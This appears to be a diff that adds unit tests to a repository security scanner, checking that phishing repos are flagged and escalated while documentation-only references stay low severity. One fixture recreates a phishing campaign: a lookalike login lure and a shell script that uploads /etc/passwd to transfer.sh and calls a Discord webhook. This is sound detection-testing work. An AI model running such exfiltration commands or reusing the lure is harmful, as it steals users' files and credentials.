@@ -587,6 +587,101 @@ packages:
         self.assertEqual(routing["decision"], "advisory_enrichment_review")
         self.assertFalse(routing["human_gate_required"])
 
+    def test_phishing_campaign_pattern_is_flagged_and_escalated(self):
+        # Reproduction of the 2026-08-15 HERMES-TOKEN / hermes-agent.icu
+        # phishing campaign: empty repo, mass-mention bait README, shortlink
+        # funnel, lookalike domain impersonating the public Hermes Agent
+        # project, and scam tracking stack on the fake landing surface.
+        zip_path = self._zip_with(
+            {
+                "repo/README.md": (
+                    "# Community Notice\n\n"
+                    "Thank you for your activity and contributions on GitHub.\n"
+                    "As part of our latest community review, we made additional information "
+                    "available to a number of participating contributors.\n\n"
+                    "[View contributor information](https://goo.su/LkV2UiR)\n"
+                ),
+                "repo/index.html": (
+                    "<html><head>"
+                    "<script async src=\"https://mc.yandex.ru/metrika/tag.js\"></script>"
+                    "<script src=\"https://top-fwz1.mail.ru/js/code.js\"></script>"
+                    "<script src=\"https://ads.digitalcaramel.com/caramel.js\"></script>"
+                    "</head><body>"
+                    "<h1>Hermes Agent — Contributor Portal</h1>"
+                    "<p>Verify your account to claim your rewards.</p>"
+                    "<a href=\"https://hermes-agent.icu/login\">Sign in to verify</a>"
+                    "</body></html>"
+                ),
+                "repo/scripts/collect.sh": (
+                    "#!/bin/sh\n"
+                    "curl -s https://discord.com/api/webhooks/1234567890/ABCDEFGHIJKLMNOP > /tmp/hook\n"
+                    "cat /tmp/hook && curl -F file=@/etc/passwd https://transfer.sh/passwd\n"
+                ),
+            }
+        )
+        with self._workspace_tmp() as work:
+            result = scan_zip(zip_path, work_root=Path(work))
+
+        categories = {finding["category"] for finding in result["findings"]}
+        self.assertIn("phishing", categories)
+        signals = {finding["signal"] for finding in result["findings"] if finding["category"] == "phishing"}
+        self.assertIn("shortlink hides destination", signals)
+        self.assertIn("brand-impersonation lookalike host", signals)
+        self.assertIn("yandex metrika on phishing surface", signals)
+        self.assertIn("mail.ru counter", signals)
+        self.assertIn("credential harvest language", signals)
+        self.assertIn("discord webhook exfil", signals)
+        self.assertIn("paste/transfer exfil", signals)
+
+        self.assertIn("Phishing Surface", result["axes"])
+        # Brand-impersonation + shortlink in HTML/code are live high signals.
+        self.assertEqual(result["axes"]["Phishing Surface"]["color"], "red")
+        self.assertEqual(result["axes"]["Phishing Surface"]["status_label"], "Risk")
+        # Multiple phishing signals co-occurring with execution surface must escalate.
+        self.assertEqual(result["security_routing"]["decision"], "block_review_before_any_run")
+        self.assertTrue(result["security_routing"]["human_gate_required"])
+
+    def test_phishing_docs_references_stay_advisory_not_red(self):
+        # A README that merely *documents* phishing concepts (a security
+        # reference repo) must not turn the whole scan red.
+        zip_path = self._zip_with(
+            {
+                "repo/README.md": (
+                    "# Phishing detection toolkit\n\n"
+                    "This repo helps you detect phishing. It discusses shortlinks like "
+                    "https://bit.ly/abc123 and lookalike domains, plus credential harvesting. See "
+                    "https://www.example.com/blog for details.\n"
+                ),
+                "repo/LICENSE": "MIT\n",
+            }
+        )
+        with self._workspace_tmp() as work:
+            result = scan_zip(zip_path, work_root=Path(work))
+
+        categories = {finding["category"] for finding in result["findings"]}
+        # Docs-only shortlink reference may surface as phishing but at low severity.
+        phishing_findings = [f for f in result["findings"] if f["category"] == "phishing"]
+        self.assertTrue(all(f["severity"] == "low" for f in phishing_findings))
+        # Docs/readme references must not create red risk or block routing.
+        self.assertEqual(result["axes"]["Phishing Surface"]["color"], "blue")
+        self.assertNotEqual(result["security_routing"]["decision"], "block_review_before_any_run")
+
+    def test_legit_repo_without_phishing_surface_stays_clean(self):
+        zip_path = self._zip_with(
+            {
+                "repo/README.md": "# Normal library\n",
+                "repo/LICENSE": "MIT\n",
+                "repo/app.py": "import requests\nresp = requests.get('https://api.example.com/v1/data')\nprint(resp.status_code)\n",
+                "repo/package.json": json.dumps({"name": "normal-lib", "version": "1.0.0"}),
+            }
+        )
+        with self._workspace_tmp() as work:
+            result = scan_zip(zip_path, work_root=Path(work))
+        phishing_findings = [f for f in result["findings"] if f["category"] == "phishing"]
+        self.assertEqual(phishing_findings, [])
+        self.assertEqual(result["axes"]["Phishing Surface"]["color"], "green")
+        self.assertEqual(result["axes"]["Phishing Surface"]["status_label"], "No signal detected by this scan")
+
 
 if __name__ == "__main__":
     unittest.main()
